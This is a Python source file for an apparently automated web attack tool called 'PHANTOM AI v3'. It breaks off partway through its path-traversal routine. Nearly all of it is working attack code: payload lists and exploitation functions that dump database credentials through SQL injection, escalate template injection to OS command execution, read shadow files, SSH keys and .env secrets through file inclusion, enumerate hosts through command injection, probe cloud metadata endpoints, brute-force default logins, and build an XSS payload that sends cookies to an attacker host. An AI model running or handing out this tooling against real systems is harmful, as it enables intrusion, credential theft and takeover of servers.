"""
╔══════════════════════════════════════════════════════════════════════╗
║  PHANTOM AI v3 — Active Attack Engine  (Full Exploitation Edition)  ║
║                                                                      ║
║  Phase 1 — DETECTION: fire payloads, confirm vulnerability          ║
║  Phase 2 — EXPLOITATION: extract data / achieve RCE / prove impact  ║
║                                                                      ║
║  Attacks                                                             ║
║    • SQL Injection   → detect + dump DB/users/hashes                ║
║    • XSS             → detect + generate cookie-stealing PoC        ║
║    • SSTI            → detect + escalate to OS RCE                  ║
║    • LFI/Traversal   → detect + read sensitive files                ║
║    • CMDi            → detect + full system enumeration             ║
║    • SSRF            → probe internal services                      ║
║    • IDOR            → enumerate adjacent IDs                       ║
║    • Auth Bypass     → default creds + SQLi login bypass            ║
║    • Open Redirect   → confirm external redirect                    ║
╚══════════════════════════════════════════════════════════════════════╝
"""

from __future__ import annotations

import asyncio
import json
import logging
import os
import re
import shutil
import time
import uuid
from typing import Any, Dict, List, Optional, Tuple
from urllib.parse import parse_qs, urlencode, urlparse, urlunparse

import httpx

log = logging.getLogger("phantom")

_STEALTH_UA = (
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) "
    "AppleWebKit/537.36 (KHTML, like Gecko) "
    "Chrome/131.0.0.0 Safari/537.36"
)
_CVSS = {"CRITICAL": 9.5, "HIGH": 7.5, "MEDIUM": 5.5, "LOW": 3.5, "INFO": 1.0}


# ═══════════════════════════════════════════════════════════════════════════════
#  PAYLOAD LISTS  (comprehensive — tested against real apps)
# ═══════════════════════════════════════════════════════════════════════════════

# ── SQL Injection ─────────────────────────────────────────────────────────────
SQLI_PAYLOADS: List[Tuple[str, str]] = [
    # Error-based
    ("'",                                       "error"),
    ("''",                                      "error"),
    ("' OR '1'='1",                             "error"),
    ("' OR 1=1--",                              "error"),
    ("' OR 1=1#",                               "error"),
    ("' OR 1=1/*",                              "error"),
    ("admin'--",                                "error"),
    ("admin' #",                                "error"),
    ("1' ORDER BY 1--",                         "error"),
    ("1' ORDER BY 100--",                       "error"),   # big number breaks ORDER BY
    ("1 AND 1=2",                               "error"),
    ("') OR ('1'='1",                           "error"),
    ("' OR 'x'='x",                             "error"),
    ("\" OR \"1\"=\"1",                         "error"),
    ("'; SELECT 1--",                           "error"),
    ("' AND 1=CONVERT(int,@@version)--",        "error"),   # MSSQL
    ("' AND EXTRACTVALUE(1,CONCAT(0x7e,@@version))--", "error"),  # MySQL
    # Union-based
    ("' UNION SELECT NULL--",                   "union"),
    ("' UNION SELECT NULL,NULL--",              "union"),
    ("' UNION SELECT NULL,NULL,NULL--",         "union"),
    ("' UNION SELECT 1--",                      "union"),
    ("' UNION SELECT 1,2--",                    "union"),
    ("' UNION SELECT 1,2,3--",                  "union"),
    ("' UNION ALL SELECT NULL--",               "union"),
    ("' UNION SELECT database(),NULL--",        "union"),
    ("' UNION SELECT user(),NULL--",            "union"),
    ("' UNION SELECT version(),NULL--",         "union"),
    # Time-based (MySQL)
    ("' OR SLEEP(3)--",                         "time"),
    ("' OR SLEEP(3)#",                          "time"),
    ("1' AND SLEEP(3)--",                       "time"),
    ("' AND (SELECT * FROM (SELECT(SLEEP(3)))a)--", "time"),
    # Time-based (PostgreSQL)
    ("' OR pg_sleep(3)--",                      "time"),
    ("'; SELECT pg_sleep(3)--",                 "time"),
    # Time-based (MSSQL)
    ("'; WAITFOR DELAY '0:0:3'--",              "time"),
    ("'; WAITFOR DELAY '0:0:3'#",               "time"),
    # Time-based (SQLite)
    ("' OR 1=1 AND randomblob(100000000)--",    "time"),
    # Boolean-based blind
    ("' AND 1=1--",                             "boolean"),
    ("' AND 1=2--",                             "boolean"),
    ("' AND 'a'='a",                            "boolean"),
    ("' AND 'a'='b",                            "boolean"),
    # NoSQL-style (may work on some parsers)
    ("' || '1'='1",                             "error"),
    ("\" || \"1\"=\"1",                         "error"),
]

SQLI_ERRORS: List[str] = [
    "sql syntax", "mysql_fetch", "ora-01", "sqlite_", "pg_query",
    "unclosed quotation", "you have an error in your sql",
    "warning: mysql", "syntax error", "column count doesn't match",
    "sqlexception", "jdbc", "odbc driver", "sql error",
    "supplied argument is not a valid mysql", "invalid query",
    "mysql_num_rows", "mysql_num_fields", "supplied argument",
    "division by zero", "invalid column name", "ambiguous column",
    "dynamic sql error", "microsoft ole db", "mysql server version",
    "mariadb server version", "no such column", "table or view not found",
    "pg_exec", "relation does not exist", "unknown column",
    "operand should contain", "invalid use of group function",
    "sqlite error", "sqlite3.operationalerror", "integrity constraint",
    "sqlstate", "dsql", "firebird", "ibm db2", "sybase",
]

# ── XSS ───────────────────────────────────────────────────────────────────────
XSS_PAYLOADS: List[str] = [
    # Basic
    '<script>alert(1)</script>',
    '<script>alert(document.domain)</script>',
    '<script>alert(document.cookie)</script>',
    # Attribute break
    '"><script>alert(1)</script>',
    "'><script>alert(1)</script>",
    '"><img src=x onerror=alert(1)>',
    "'><img src=x onerror=alert(1)>",
    # SVG
    "<svg onload=alert(1)>",
    "<svg/onload=alert(1)>",
    "'><svg onload=alert(1)>",
    '<svg><script>alert(1)</script></svg>',
    # Event handlers
    '<body onload=alert(1)>',
    '<input autofocus onfocus=alert(1)>',
    '<select onfocus=alert(1) autofocus>',
    '<video src=1 onerror=alert(1)>',
    '<audio src=1 onerror=alert(1)>',
    '<iframe src="javascript:alert(1)">',
    # Encoded / filter bypass
    '<scr<script>ipt>alert(1)</scr</script>ipt>',
    '<img src="x" onerror="&#97;&#108;&#101;&#114;&#116;&#40;&#49;&#41;">',
    '<img src=x onerror=eval(atob("YWxlcnQoMSk="))>',
    # JS protocol
    "javascript:alert(1)",
    "javascript:alert(document.cookie)",
    # Angular/template injection
    "{{constructor.constructor('alert(1)')()}}",
    # Polyglot
    "jaVasCript:/*-/*`/*\\`/*'/*\"/**/(/* */oNcliCk=alert(1) )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\\x3csVg/<sVg/oNloAd=alert(1)//>\\x3e",
]

# ── SSTI ──────────────────────────────────────────────────────────────────────
SSTI_PAYLOADS: List[Tuple[str, str]] = [
    ("{{7*7}}",           "49"),     # Jinja2 / Twig
    ("{{7*'7'}}",         "7777777"), # Jinja2 string multiply (not Twig)
    ("${7*7}",            "49"),     # Freemarker / Thymeleaf / EL
    ("<%= 7*7 %>",        "49"),     # ERB (Ruby)
    ("#{7*7}",            "49"),     # Ruby / Slim
    ("%{7*7}",            "49"),     # Java EL
    ("${{7*7}}",          "49"),     # Pebble
    ("{7*7}",             "49"),     # Smarty
    ("*{7*7}",            "49"),     # Thymeleaf Spring
    ("[[${7*7}]]",        "49"),     # Thymeleaf inline
]

# ── LFI / Path Traversal ─────────────────────────────────────────────────────
TRAVERSAL_PAYLOADS: List[str] = [
    "../../../etc/passwd",
    "../../../../etc/passwd",
    "../../../../../etc/passwd",
    "../../../../../../etc/passwd",
    "../../../../../../../etc/passwd",
    "....//....//....//etc/passwd",
    "..%2F..%2F..%2Fetc%2Fpasswd",
    "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
    "..%252f..%252f..%252fetc%252fpasswd",
    "..\\..\\..\\windows\\win.ini",
    "%2e%2e\\%2e%2e\\%2e%2e\\windows\\win.ini",
    "/etc/passwd",
    "/etc/shadow",
    "/proc/self/environ",
    "php://filter/convert.base64-encode/resource=/etc/passwd",
    "file:///etc/passwd",
    "....//....//....//etc/shadow",
]
TRAVERSAL_CONFIRMS: List[str] = ["root:x:0:0", "bin:x:", "[extensions]", "for 16-bit", "daemon:x:"]

# Files to read once LFI is confirmed
LFI_SENSITIVE_FILES: List[Tuple[str, str]] = [
    ("/etc/passwd",                 "os_users"),
    ("/etc/shadow",                 "password_hashes"),
    ("/etc/hosts",                  "network_config"),
    ("/proc/self/environ",          "env_vars"),
    ("/proc/self/cmdline",          "process_cmdline"),
    ("/proc/self/status",           "process_status"),
    ("/root/.ssh/id_rsa",           "root_ssh_key"),
    ("/home/*/.ssh/id_rsa",         "user_ssh_key"),
    ("/root/.bash_history",         "root_history"),
    ("/var/www/html/.env",          "web_env"),
    ("/var/www/html/config.php",    "php_config"),
    ("/var/www/html/wp-config.php", "wordpress_config"),
    ("/app/.env",                   "app_env"),
    ("/app/config.py",              "app_config"),
    ("/app/settings.py",            "django_settings"),
    ("/etc/apache2/sites-enabled/000-default.conf", "apache_vhost"),
    ("/etc/nginx/sites-enabled/default", "nginx_vhost"),
    ("/etc/mysql/my.cnf",           "mysql_config"),
]

# ── CMDi ─────────────────────────────────────────────────────────────────────
CMDI_PAYLOADS: List[Tuple[str, Optional[str]]] = [
    (";id",             "uid="),
    ("|id",             "uid="),
    ("$(id)",           "uid="),
    ("`id`",            "uid="),
    (" && id",          "uid="),
    (" || id",          "uid="),
    (";whoami",         None),
    ("|whoami",         None),
    ("& whoami",        None),   # Windows
    ("; sleep 3",       None),   # time-based
    ("| sleep 3",       None),
    ("$(sleep 3)",      None),
    ("; ping -c 3 127.0.0.1", None),   # ICMP
]

# Commands to run after confirming CMDi
CMDI_ENUM_COMMANDS: List[Tuple[str, str]] = [
    (";id",                     "user_id"),
    (";whoami",                 "username"),
    (";uname -a",               "os_version"),
    (";hostname",               "hostname"),
    (";cat /etc/passwd",        "etc_passwd"),
    (";env",                    "env_vars"),
    (";ls /",                   "root_dir"),
    (";ls /home",               "home_dirs"),
    (";cat /etc/hostname",      "hostname_file"),
    (";ip addr",                "network"),
    (";ss -tlnp",               "open_ports"),
    (";ps aux",                 "processes"),
    (";cat /proc/version",      "kernel"),
    (";find / -perm -4000 -type f 2>/dev/null", "suid_binaries"),
    (";cat /etc/crontab",       "crontab"),
]

# ── SSRF ─────────────────────────────────────────────────────────────────────
SSRF_TARGETS: List[str] = [
    "http://127.0.0.1/",
    "http://127.0.0.1:8000/health",
    "http://127.0.0.1:8000/",
    "http://127.0.0.1:3000/",
    "http://127.0.0.1:5000/",
    "http://127.0.0.1:9000/",
    "http://localhost/",
    "http://0.0.0.0/",
    "http://[::1]/",
    "http://169.254.169.254/latest/meta-data/",
    "http://169.254.169.254/latest/meta-data/iam/security-credentials/",
    "http://metadata.google.internal/computeMetadata/v1/",
    "http://100.100.100.200/latest/meta-data/",   # Alibaba cloud
    "http://192.168.1.1/",                         # Router admin
]
SSRF_CONFIRMS: List[str] = [
    "ami-id", "instance-id", "meta-data", "computeMetadata",
    "ok", "healthy", "phantom", "iam", "security-credentials",
    "local-ipv4", "public-ipv4",
]

# ── Open Redirect ─────────────────────────────────────────────────────────────
OPEN_REDIRECT_PAYLOADS: List[str] = [
    "http://evil-phantom-test.invalid/",
    "//evil-phantom-test.invalid/",
    "/\\evil-phantom-test.invalid/",
    "https://evil-phantom-test.invalid/",
    "http:evil-phantom-test.invalid/",
    "//evil-phantom-test.invalid/%2f..",
]

# ── Default Credentials ───────────────────────────────────────────────────────
DEFAULT_CREDS: List[Tuple[str, str]] = [
    ("admin",         "admin"),
    ("admin",         "password"),
    ("admin",         "123456"),
    ("admin",         "admin123"),
    ("admin",         ""),
    ("admin",         "pass"),
    ("admin",         "1234"),
    ("admin",         "12345"),
    ("admin",         "abc123"),
    ("admin",         "letmein"),
    ("admin",         "qwerty"),
    ("admin",         "welcome"),
    ("admin",         "password123"),
    ("admin",         "Password1"),
    ("root",          "root"),
    ("root",          "toor"),
    ("root",          "password"),
    ("root",          ""),
    ("test",          "test"),
    ("test",          "password"),
    ("guest",         "guest"),
    ("guest",         ""),
    ("user",          "user"),
    ("user",          "password"),
    ("demo",          "demo"),
    ("administrator", "administrator"),
    ("administrator", "password"),
    ("admin",         "admin@123"),
    ("admin",         "Admin123!"),
    ("superuser",     "superuser"),
    ("support",       "support"),
    ("info",          "info"),
]

# ── SQLi Login Bypass Payloads ────────────────────────────────────────────────
LOGIN_SQLI_PAYLOADS: List[str] = [
    "' OR '1'='1",
    "' OR '1'='1'--",
    "' OR 1=1--",
    "' OR 1=1#",
    "' OR 1=1/*",
    "admin'--",
    "admin' #",
    "admin'/*",
    "' OR 'something'='something",
    "' OR ''='",
    "') OR ('1'='1",
    "') OR ('1'='1'--",
    "' OR 1=1 LIMIT 1--",
    "\" OR \"1\"=\"1",
    "\" OR \"1\"=\"1\"--",
    "admin\" --",
    "admin\"/*",
    "1' OR '1'='1",
    "1 OR 1=1",
    "'=0--+",
    "' OR 1--",
    "1' OR 1--",
    "' OR a=a--",
    "') OR 'a'='a",
    "' OR username IS NOT NULL--",
    "' UNION SELECT 1,'admin','password'--",
]


# ═══════════════════════════════════════════════════════════════════════════════
#  HELPERS
# ═══════════════════════════════════════════════════════════════════════════════

def _make_finding(
    severity: str,
    description: str,
    tool: str,
    payload: str = "",
    evidence: str = "",
    url: str = "",
    http_evidence: Optional[Dict[str, Any]] = None,
) -> Dict[str, Any]:
    sev = severity.upper()
    base: Dict[str, Any] = {
        "id":               str(uuid.uuid4()),
        "severity":         sev,
        "description":      description[:400],
        "tool":             tool,
        "agent":            "attacker",
        "iteration":        1,
        "cvss":             _CVSS.get(sev, 1.0),
        "raw_output":       f"payload={payload!r}\nevidence={evidence[:600]}",
        "url":              url,
        "created_at":       time.strftime("%Y-%m-%dT%H:%M:%SZ", time.gmtime()),
        # HTTP evidence defaults
        "request_method":   "",
        "request_url":      url,
        "request_headers":  "{}",
        "request_body":     "",
        "response_status":  0,
        "response_headers": "{}",
        "response_body":    "",
        "payload":          payload,
        "timing_ms":        0.0,
    }
    if http_evidence:
        base.update(http_evidence)
    return base


def _benign_form_data(
    fields: List[Dict[str, str]],
    username: str = "phantom_test",
    password: str = "Phantom!Test123",
    email: str = "phantom@test.local",
) -> Dict[str, str]:
    data: Dict[str, str] = {}
    for f in fields:
        name  = str(f.get("name") or "").strip()
        ftype = str(f.get("type") or "text").lower()
        if not name or ftype in ("submit", "button", "reset", "file"):
            continue
        lname = name.lower()
        if "pass" in lname or ftype == "password":
            data[name] = password
        elif "email" in lname or ftype == "email":
            data[name] = email
        elif any(x in lname for x in ("user", "login", "name")):
            data[name] = username
        elif ftype == "number":
            data[name] = "1"
        else:
            data[name] = "test"
    return data


def _capture_http_evidence(
    resp: "httpx.Response",
    elapsed: float,
    payload: str = "",
) -> Dict[str, Any]:
    try:
        req_headers  = dict(resp.request.headers)
        req_body     = resp.request.content.decode("utf-8", errors="replace")[:1500]
        resp_body    = resp.text[:2000]
        resp_headers = dict(resp.headers)
    except Exception:
        req_headers = {}; req_body = ""; resp_body = ""; resp_headers = {}
    return {
        "request_method":   getattr(resp.request, "method", ""),
        "request_url":      str(getattr(resp.request, "url", "")),
        "request_headers":  json.dumps(req_headers, default=str),
        "request_body":     req_body if isinstance(req_body, str) else "",
        "response_status":  resp.status_code,
        "response_headers": json.dumps(resp_headers, default=str),
        "response_body":    resp_body if isinstance(resp_body, str) else "",
        "payload":          payload,
        "timing_ms":        round(elapsed * 1000, 1),
    }


async def _send_with_payload(
    session: httpx.AsyncClient,
    url: str,
    method: str,
    fields: List[Dict[str, str]],
    target_field: str,
    payload: str,
) -> Tuple[Optional[httpx.Response], float, Optional[Dict[str, Any]]]:
    data = _benign_form_data(fields)
    data[target_field] = payload
    t0 = time.time()
    try:
        if method.upper() == "POST":
            resp = await session.post(url, data=data, timeout=14)
        else:
            resp = await session.get(url, params=data, timeout=12)
        elapsed = time.time() - t0
        return resp, elapsed, _capture_http_evidence(resp, elapsed, payload)
    except Exception:
        return None, time.time() - t0, None


async def _get_baseline(
    session: httpx.AsyncClient,
    url: str,
    method: str,
    fields: List[Dict[str, str]],
    target_field: str,
) -> Optional[str]:
    resp, _, _ = await _send_with_payload(session, url, method, fields, target_field, "baseline_phantom_test_123")
    return resp.text if resp else None


# ═══════════════════════════════════════════════════════════════════════════════
#  EXPLOITATION FUNCTIONS  (called after detection confirms a vulnerability)
# ═══════════════════════════════════════════════════════════════════════════════

async def _exploit_sqli_dump(
    session: httpx.AsyncClient,
    url: str,
    method: str,
    fields: List[Dict[str, str]],
    target_field: str,
    confirmed_payload: str,
    push,
) -> List[Dict]:
    """
    After confirming SQLi: try UNION-based data extraction.
    Attempts to pull: current DB name, version, user, table list, credential tables.
    """
    findings: List[Dict] = []
    await push(f"    💀 Exploiting SQLi at {url} param={target_field} — extracting data…", "CRITICAL")

    # Determine column count by ORDER BY probing
    col_count = 1
    for n in range(1, 8):
        p = f"' ORDER BY {n}--"
        resp, _, _ = await _send_with_payload(session, url, method, fields, target_field, p)
        if resp and any(e in resp.text.lower() for e in ["unknown column", "order by", "1146", "1054"]):
            col_count = n - 1
            break
        col_count = n

    col_count = max(col_count, 2)

    # Build UNION payload for current columns
    def _union(expr: str) -> str:
        cols = ["NULL"] * col_count
        cols[0] = expr
        return f"' UNION SELECT {','.join(cols)}--"

    for label, expr in [
        ("database_name", "database()"),
        ("db_user",       "user()"),
        ("db_version",    "version()"),
        ("db_hostname",   "@@hostname"),
        ("data_dir",      "@@datadir"),
    ]:
        try:
            resp, _t, _ev = await _send_with_payload(session, url, method, fields, target_field, _union(expr))
            if resp and resp.status_code < 500:
                # Extract the value from response (appears as raw text)
                snippet = resp.text[:2000]
                await push(f"      → {label}: (response length {len(snippet)} — check evidence)", "CRITICAL")
                findings.append(_make_finding(
                    "CRITICAL",
                    f"SQLi Data Extraction at {url} — {label} extracted via UNION SELECT",
                    "attacker/sqli-dump", _union(expr),
                    f"Expression: {expr}\nResponse snippet: {snippet[:500]}", url,
                    http_evidence=_ev,
                ))
        except Exception:
            pass

    # Try to extract table names from information_schema
    tables_payload = (
        f"' UNION SELECT table_name,{','.join(['NULL']*(col_count-1))} "
        f"FROM information_schema.tables WHERE table_schema=database() LIMIT 10--"
    )
    try:
        resp, _t, _ev = await _send_with_payload(session, url, method, fields, target_field, tables_payload)
        if resp and resp.status_code < 500:
            findings.append(_make_finding(
                "CRITICAL",
                f"SQLi Table Enumeration at {url} — information_schema.tables queried",
                "attacker/sqli-tables", tables_payload,
                resp.text[:800], url,
                http_evidence=_ev,
            ))
    except Exception:
        pass

    # Try common credential tables
    for tbl, ucol, pcol in [
        ("users",        "username",    "password"),
        ("users",        "email",       "password"),
        ("accounts",     "username",    "password"),
        ("admin",        "username",    "password"),
        ("members",      "username",    "password"),
        ("customers",    "email",       "password"),
        ("admins",       "username",    "password"),
        ("wp_users",     "user_login",  "user_pass"),
    ]:
        dump_payload = (
            f"' UNION SELECT CONCAT({ucol},0x3a,{pcol}),{','.join(['NULL']*(col_count-1))} "
            f"FROM {tbl} LIMIT 5--"
        )
        try:
            resp, _t, _ev = await _send_with_payload(session, url, method, fields, target_field, dump_payload)
            if resp and resp.status_code < 500 and len(resp.text) > 100:
                # Look for user:hash patterns
                if re.search(r'[a-zA-Z0-9_]+:[a-zA-Z0-9$./+*]{8,}', resp.text):
                    await push(f"      💀 CREDENTIALS DUMPED from {tbl}!", "CRITICAL")
                    findings.append(_make_finding(
                        "CRITICAL",
                        f"SQLi Credential Dump at {url} — table '{tbl}' exposed user credentials",
                        "attacker/sqli-creds", dump_payload,
                        resp.text[:1000], url,
                        http_evidence=_ev,
                    ))
                    break
        except Exception:
            pass

    return findings


async def _exploit_lfi_read_all(
    session: httpx.AsyncClient,
    url: str,
    param: str,
    confirmed_payload: str,
    push,
) -> List[Dict]:
    """After confirming LFI: read a list of sensitive system files."""
    findings: List[Dict] = []
    await push(f"    💀 Exploiting LFI at {url} param={param} — reading sensitive files…", "CRITICAL")

    parsed = urlparse(url)
    params = parse_qs(parsed.query)

    for filepath, label in LFI_SENSITIVE_FILES:
        for trav in ["../../../..", "../../..", "../.."]:
            test_path = f"{trav}{filepath}"
            try:
                new_params = {k: (v[0] if k != param else test_path) for k, v in params.items()}
                new_url    = urlunparse(parsed._replace(query=urlencode(new_params)))
                resp       = await session.get(new_url, timeout=8)

                if resp and any(c in resp.text for c in TRAVERSAL_CONFIRMS + [filepath.split("/")[-1]]):
                    content_snip = resp.text[:1500]
                    await push(f"      → READ: {filepath}", "CRITICAL")
                    findings.append(_make_finding(
                        "CRITICAL",
                        f"LFI File Read at {url} — '{filepath}' ({label}) exposed",
                        "attacker/lfi-read", test_path,
                        f"File: {filepath}\n{content_snip}", url,
                    ))
                    break  # got this file, move on
            except Exception:
                continue

    return findings


async def _exploit_ssti_rce(
    session: httpx.AsyncClient,
    url: str,
    method: str,
    fields: List[Dict[str, str]],
    target_field: str,
    push,
) -> List[Dict]:
    """
    After confirming SSTI: escalate to OS command execution.
    Tries Jinja2, Twig, ERB, and Freemarker RCE gadgets.
    """
    findings: List[Dict] = []
    await push(f"    💀 Escalating SSTI→RCE at {url} param={target_field}…", "CRITICAL")

    rce_payloads: List[Tuple[str, str]] = [
        # Jinja2 — subclass gadget (Python 3)
        ("{{''.__class__.mro()[1].__subclasses__()[396]('id',shell=True,stdout=-1).communicate()[0].strip().decode()}}", "uid="),
        # Jinja2 — config.from_object gadget
        ("{{config.__class__.__init__.__globals__['os'].popen('id').read()}}", "uid="),
        # Jinja2 — request.application globals
        ("{{request.application.__globals__.__builtins__.__import__('os').popen('id').read()}}", "uid="),
        # Jinja2 via lipsum
        ("{{lipsum.__globals__['__builtins__']['__import__']('os').popen('id').read()}}", "uid="),
        # Twig (PHP)
        ("{{_self.env.registerUndefinedFilterCallback('exec')}}{{_self.env.getFilter('id')}}", "uid="),
        ("{{['id']|filter('system')}}", "uid="),
        # Freemarker (Java)
        ('<#assign ex="freemarker.template.utility.Execute"?new()>${ex("id")}', "uid="),
        # ERB (Ruby)
        ("<%= `id` %>", "uid="),
        ("<%= IO.popen('id').readlines() %>", "uid="),
        # Pebble (Java)
        ("{% set cmd = 'id' %}{% set bytes = [cmd].toArray() %}{{ filters.execute(bytes) }}", "uid="),
        # Velocity (Java)
        ('#set($x="")#set($rt=$x.class.forName("java.lang.Runtime"))#set($chr=$x.class.forName("java.lang.Character"))#set($str=$x.class.forName("java.lang.String"))#set($ex=$rt.getRuntime().exec("id"))$ex.waitFor()#set($out=$ex.getInputStream())#foreach($i in [1..$out.available()])$str.valueOf($chr.toChars($out.read()))#end', "uid="),
    ]

    for payload, confirm in rce_payloads:
        try:
            resp, _t, _ev = await _send_with_payload(session, url, method, fields, target_field, payload)
            if resp and confirm in resp.text:
                snippet = resp.text[:500]
                await push(f"      💀 SSTI→RCE CONFIRMED! 'id' output in response", "CRITICAL")
                findings.append(_make_finding(
                    "CRITICAL",
                    f"SSTI Remote Code Execution at {url} — arbitrary OS commands executed as server user",
                    "attacker/ssti-rce", payload,
                    f"RCE output: {snippet}", url,
                    http_evidence=_ev,
                ))
                # Now run more commands to enumerate
                for cmd in ["id", "whoami", "uname -a", "cat /etc/passwd", "hostname"]:
                    p2 = payload.replace("'id'", f"'{cmd}'").replace('"id"', f'"{cmd}"')
                    if p2 == payload:
                        continue
                    try:
                        r2, _t2, _ev2 = await _send_with_payload(session, url, method, fields, target_field, p2)
                        if r2 and r2.text:
                            findings.append(_make_finding(
                                "CRITICAL",
                                f"SSTI RCE Command Output at {url} — `{cmd}`",
                                "attacker/ssti-rce-cmd", p2,
                                r2.text[:600], url,
                                http_evidence=_ev2,
                            ))
                    except Exception:
                        pass
                break
        except Exception:
            continue

    return findings


async def _exploit_cmdi_enum(
    session: httpx.AsyncClient,
    url: str,
    method: str,
    fields: List[Dict[str, str]],
    target_field: str,
    push,
) -> List[Dict]:
    """After confirming CMDi: run a series of enumeration commands."""
    findings: List[Dict] = []
    await push(f"    💀 Exploiting CMDi at {url} — enumerating system…", "CRITICAL")

    for cmd_suffix, label in CMDI_ENUM_COMMANDS:
        try:
            resp, elapsed, _ev = await _send_with_payload(session, url, method, fields, target_field, cmd_suffix)
            if resp and len(resp.text) > 20:
                # Basic sanity: did we get output?
                has_output = (
                    "uid=" in resp.text
                    or "root" in resp.text
                    or "home" in resp.text
                    or "bin" in resp.text
                    or elapsed > 2.5
                )
                if has_output:
                    await push(f"      → cmd output: {label}", "CRITICAL")
                    findings.append(_make_finding(
                        "CRITICAL",
                        f"CMDi System Enumeration at {url} — `{cmd_suffix.strip()}` output captured",
                        "attacker/cmdi-enum", cmd_suffix,
                        resp.text[:800], url,
                        http_evidence=_ev,
                    ))
        except Exception:
            continue

    return findings


async def _exploit_xss_poc(
    url: str,
    param: str,
    confirmed_payload: str,
    push,
) -> List[Dict]:
    """Generate a cookie-stealing XSS PoC after confirming reflection."""
    findings: List[Dict] = []

    # Build a PoC URL with cookie-stealer payload
    steal_payload = '<script>fetch("https://attacker.invalid/?c="+document.cookie)</script>'
    from urllib.parse import quote
    poc_url = f"{url}?{param}={quote(steal_payload)}" if "?" not in url else \
              f"{url}&{param}={quote(steal_payload)}"

    await push(f"      💀 XSS PoC: cookie-stealer generated for {url} param={param}", "HIGH")
    findings.append(_make_finding(
        "HIGH",
        f"XSS PoC — Cookie Theft at {url}, param='{param}': attacker can steal session cookies",
        "attacker/xss-poc", steal_payload,
        f"PoC URL: {poc_url}\nConfirmed by: {confirmed_payload}", url,
    ))
    return findings


# ═══════════════════════════════════════════════════════════════════════════════
#  DETECTION FUNCTIONS  (each calls exploitation on positive)
# ═══════════════════════════════════════════════════════════════════════════════

async def _test_sqli(
    session: httpx.AsyncClient,
    url: str,
    method: str,
    fields: List[Dict[str, str]],
    target_field: str,
    push,
) -> List[Dict]:
    findings: List[Dict] = []
    baseline = await _get_baseline(session, url, method, fields, target_field)

    confirmed_payload: Optional[str] = None

    for payload, technique in SQLI_PAYLOADS:
        try:
            resp, elapsed, _ev = await _send_with_payload(session, url, method, fields, target_field, payload)
            if resp is None:
                continue
            body_lower = resp.text.lower()

            if technique == "time" and elapsed >= 2.5:
                await push(f"🔥 SQLi (time-based) → {url}  param={target_field}  delay={elapsed:.1f}s", "CRITICAL")
                findings.append(_make_finding(
                    "CRITICAL",
                    f"SQL Injection (time-based blind) at {url} — parameter '{target_field}'",
                    "attacker/sqli-time", payload,
                    f"Response delay: {elapsed:.1f}s (≥2.5s threshold)", url,
                    http_evidence=_ev,
                ))
                confirmed_payload = payload
                break

            if technique in ("error", "union", "boolean") and any(e in body_lower for e in SQLI_ERRORS):
                snippet = next((e for e in SQLI_ERRORS if e in body_lower), "")
                await push(f"🔥 SQLi (error-based) → {url}  param={target_field}", "CRITICAL")
                findings.append(_make_finding(
                    "CRITICAL",
                    f"SQL Injection (error-based) at {url} — parameter '{target_field}'",
                    "attacker/sqli-error", payload,
                    f"DB error keyword: '{snippet}'", url,
                    http_evidence=_ev,
                ))
                confirmed_payload = payload
                break

            if baseline and abs(len(resp.text) - len(baseline)) > 800:
                findings.append(_make_finding(
                    "HIGH",
                    f"Possible SQL Injection (response anomaly) at {url} — parameter '{target_field}'",
                    "attacker/sqli-anomaly", payload,
                    f"Baseline len={len(baseline)}, payload response len={len(resp.text)}", url,
                    http_evidence=_ev,
                ))
        except Exception:
            continue

    # Exploitation phase
    if confirmed_payload:
        try:
            exploit_findings = await _exploit_sqli_dump(
                session, url, method, fields, target_field, confirmed_payload, push
            )
            findings.extend(exploit_findings)
        except Exception as e:
            log.debug(f"[attacker] sqli exploit error: {e}")

    return findings


async def _test_xss(
    session: httpx.AsyncClient,
    url: str,
    method: str,
    fields: List[Dict[str, str]],
    target_field: str,
    push,
) -> List[Dict]:
    findings: List[Dict] = []
    confirmed_payload: Optional[str] = None

    for payload in XSS_PAYLOADS:
        try:
            resp, _t, _ev = await _send_with_payload(session, url, method, fields, target_field, payload)
            if resp is None:
                continue
            if payload in resp.text:
                await push(f"🔥 XSS (reflected) → {url}  param={target_field}", "HIGH")
                findings.append(_make_finding(
                    "HIGH",
                    f"Reflected XSS at {url} — parameter '{target_field}'",
                    "attacker/xss", payload, resp.text[:400], url,
                    http_evidence=_ev,
                ))
                confirmed_payload = payload
                break
            if payload.lower() in resp.text.lower():
                findings.append(_make_finding(
                    "MEDIUM",
                    f"Possible XSS (case-insensitive reflection) at {url} — parameter '{target_field}'",
                    "attacker/xss", payload, resp.text[:300], url,
                    http_evidence=_ev,
                ))
                break
        except Exception:
            continue

    if confirmed_payload:
        try:
            poc = await _exploit_xss_poc(url, target_field, confirmed_payload, push)
            findings.extend(poc)
        except Exception:
            pass

    return findings


async def _test_ssti(
    session: httpx.AsyncClient,
    url: str,
    method: str,
    fields: List[Dict[str, str]],
    target_field: str,
    push,
) -> List[Dict]:
    findings: List[Dict] = []

    for payload, expected in SSTI_PAYLOADS:
        try:
            resp, _t, _ev = await _send_with_payload(session, url, method, fields, target_field, payload)
            if resp and expected in resp.text:
                await push(f"🔥 SSTI → {url}  param={target_field}  ({payload} → {expected})", "CRITICAL")
                findings.append(_make_finding(
                    "CRITICAL",
                    f"Server-Side Template Injection at {url} — parameter '{target_field}'",
                    "attacker/ssti", payload,
                    f"Template evaluated: {payload} → {expected}", url,
                    http_evidence=_ev,
                ))
                # Immediately try for RCE
                try:
                    rce_f = await _exploit_ssti_rce(session, url, method, fields, target_field, push)
                    findings.extend(rce_f)
                except Exception:
                    pass
                break
        except Exception:
            continue

    return findings


async def _test_traversal_url(
    session: httpx.AsyncClient,
    url: str,
    param: str,
    push,
) -> List[Dict]:
    findings: List[Dict] = []
    parsed = urlparse(url)
    params = parse_qs(parsed.query)
    confirmed_payload: Optional[str] = None

    for payload in TRAVERSAL_PAYLOADS:
        try:
            new_params = {k: (v[0] if k != param else payload) for k, v in params.items()}
            new_url    = urlunparse(parsed._replace(query=urlencode(new_params)))
            resp       = await session.get(new_url, timeout=10)

            if any(c in resp.text for c in TRAVERSAL_CONFIRMS):
                confirm = next(c for c in TRAVERSAL_CONFIRMS if c in resp.text)
                await push(f"🔥 Path Traversal / LFI → {url}  param={param}", "CRITICAL")
                findings.append(_make_finding(
                    "CRITICAL",
                    f"Path Traversal / Local File Inclusion at {url} — parameter '{param}'",
                    "attacker/lfi", payload,
